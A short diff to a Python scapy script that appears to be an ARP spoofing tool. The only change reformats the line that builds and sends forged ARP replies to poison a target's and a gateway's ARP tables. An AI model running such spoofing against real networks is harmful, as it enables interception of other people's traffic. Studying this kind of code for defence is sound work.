@@ -19,8 +19,7 @@ def get_mac(ip):
 
 # Poison Target's and Gateway's ARP tables 
 def spoof(target_ip, spoof_ip):
-	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),
-															psrc = spoof_ip)
+	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
 	scapy.send(packet, verbose = False)
 
 # Reset ARP tables back to original values
